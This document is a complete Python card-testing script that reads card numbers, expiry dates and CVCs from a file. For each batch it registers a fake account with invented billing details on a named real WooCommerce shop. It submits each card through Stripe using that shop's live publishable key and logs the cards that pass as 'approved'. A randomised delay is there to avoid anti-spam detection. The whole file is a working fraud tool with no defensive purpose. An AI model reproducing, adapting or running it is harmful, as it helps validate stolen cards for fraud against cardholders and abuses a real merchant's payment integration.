import requests
import re
import time
import random
import urllib.parse
import os
from faker import Faker

fake = Faker()
BASE_URL = "https://www.propski.co.uk"
STRIPE_PK = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"

def read_cc_file(filename):
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if line:
                    parts = line.split('|')
                    if len(parts) == 4:
                        cards.append({
                            'number': parts[0].replace(' ', ''),
                            'exp_month': parts[1].zfill(2),
                            'exp_year': parts[2] if len(parts[2]) == 4 else f"20{parts[2]}",
                            'cvc': parts[3]
                        })
        return cards
    except FileNotFoundError:
        print(f"Error: File {filename} not found.")
        return []

def save_approved_card(card_details):
    try:
        with open('approved.txt', 'a', encoding='utf-8') as file:
            card_string = f"{card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}|{card_details['cvc']} Status: Approved\n"
            file.write(card_string)
    except Exception as e:
        print(f"Error saving approved card: {e}")

def get_session():
    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    })
    return s

def setup_account(session):
    """Combines registration and billing address setup."""
    email = f"{fake.first_name().lower()}{random.randint(100,999)}@gmail.com"
    print(f"Setting up account with: {email}")

    # 1. Register
    r_page = session.get(f"{BASE_URL}/my-account/")
    reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r_page.text)
    if not reg_nonce: return None, None
    
    reg_data = {
        'email': email,
        'woocommerce-register-nonce': reg_nonce.group(1),
        'register': 'Register',
        'action': 'register'
    }
    session.post(f"{BASE_URL}/my-account/", data=reg_data)

    # 2. Post Billing
    addr_page = session.get(f"{BASE_URL}/my-account/edit-address/billing/")
    addr_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addr_page.text)
    if not addr_nonce: return None, None

    billing_data = {
        'billing_first_name': fake.first_name(),
        'billing_last_name': fake.last_name(),
        'billing_country': 'AU',
        'billing_address_1': 'Street allen 45',
        'billing_city': 'Sydney',
        'billing_state': 'NSW',
        'billing_postcode': '2000',
        'billing_phone': '15525546325',
        'billing_email': email,
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': addr_nonce.group(1),
        'action': 'edit_address',
    }
    session.post(f"{BASE_URL}/my-account/edit-address/billing/", data=billing_data)

    # 3. Get Add Payment Nonce
    pay_page = session.get(f"{BASE_URL}/my-account/add-payment-method/")
    add_nonce = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', pay_page.text)
    
    return email, add_nonce.group(1) if add_nonce else None

def create_payment_method(card_details, email):
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'}
    data = {
        'type': 'card',
        'owner[email]': email,
        'card[number]': card_details['number'],
        'card[cvc]': card_details['cvc'],
        'card[exp_month]': card_details['exp_month'],
        'card[exp_year]': card_details['exp_year'],
        'key': STRIPE_PK
    }
    try:
        resp = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        if resp.status_code == 200:
            return resp.json().get('id')
    except Exception as e:
        print(f"Stripe Error: {e}")
    return None

def confirm_on_site(session, pmid, nonce):
    params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
    data = {'stripe_source_id': pmid, 'nonce': nonce}
    try:
        r = session.post(f"{BASE_URL}/", params=params, data=data)
        if r.status_code == 200:
            res = r.json()
            return res.get('status') == 'success', res
    except:
        pass
    return False, {}

def check_card(card_details, session, email, nonce):
    print(f"\nChecking: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}")
    
    pmid = create_payment_method(card_details, email)
    if not pmid:
        print("Failed to create Stripe Source")
        return False
    
    success, response = confirm_on_site(session, pmid, nonce)
    if success:
        print("✅ Approved!")
        save_approved_card(card_details)
        return True
    else:
        err_msg = response.get('error', {}).get('message', 'Declined')
        print(f"❌ {err_msg}")
        return False

if __name__ == "__main__":
    if os.path.exists('approved.txt'): os.remove('approved.txt')
    cards = read_cc_file('cc.txt')
    
    if not cards:
        print("No cards found.")
    else:
        print(f"Found {len(cards)} cards. Initializing session...")
        s = get_session()
        email, action_nonce = setup_account(s)
        
        if not action_nonce:
            print("Failed to initialize site session.")
        else:
            approved_count = 0
            for i, card in enumerate(cards, 1):
                if check_card(card, s, email, action_nonce):
                    approved_count += 1
                time.sleep(random.uniform(5, 8)) # Anti-spam delay
            
            print(f"\nDone: {approved_count}/{len(cards)} approved.")
